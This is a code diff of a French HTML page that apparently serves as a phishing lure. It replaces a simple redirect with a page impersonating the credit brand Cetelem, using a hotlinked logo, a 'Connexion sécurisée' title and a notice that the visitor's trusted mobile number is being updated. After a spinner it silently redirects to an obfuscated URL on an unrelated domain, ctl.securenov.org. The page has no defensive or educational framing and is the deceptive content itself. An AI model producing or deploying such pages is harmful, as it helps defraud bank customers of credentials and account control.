@@ -1,13 +1,61 @@
 <!DOCTYPE html>
 <html lang="fr">
-    <script>
-        // Redirection automatique après 5 secondes
-        setTimeout(function() {
-            window.location.href = 'https://google.com'; // Remplacez 'https://example.com' par l'URL de redirection souhaitée
-        }, 1000); // 5000 millisecondes = 5 secondes
-    </script>
+
+<head>
+    <meta charset="UTF-8">
+    <title>Connexion sécurisée</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f9f9f9;
+            text-align: center;
+            padding-top: 100px;
+            margin: 0;
+        }
+
+        .logo {
+            width: 195px;
+            margin: 0 auto 30px;
+            display: block;
+        }
+
+        .content {
+            max-width: 600px;
+            margin: 0 auto;
+            line-height: 1.6;
+        }
+
+        .spinner {
+            display: inline-block;
+            width: 24px;
+            height: 24px;
+            border: 3px solid #4CAF50;
+            border-top: 3px solid transparent;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            vertical-align: middle;
+            margin-left: 10px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
 </head>
+
 <body>
-    <h1></h1>
+    <p><img src="https://www.credit-conso.org/wp-content/uploads/2023/07/cetelem-logo-carte.png" alt="Logo Cetelem" class="logo" style="margin: 0 auto; display: block; width: 296px;"></p>
+    <div class="content">
+        <h2>Vous allez proc&eacute;der &agrave; la mise &agrave; jour de votre num&eacute;ro mobile de confiance.</h2>
+        <p><em>Veuillez patienter un instant...</em><span class="spinner"></span></p>
+    </div>
+    <script>
+        setTimeout(function () {
+            window.location.replace("https://ctl.securenov.org/zqzqvsgtlpzwtsjqsfglxcWhonjxwvmDslhxgszwpxXiFizwlprtFiPhnlFvpiwipxhxzqtsvsyivDmzslPnPhPaihPnpiApihxsPhZvpiyiGwZvpiFvWzZvonNXdQdQ");
+        }, 7500); // Redirection après 5,5 secondes
+    </script>
 </body>
+
 </html>
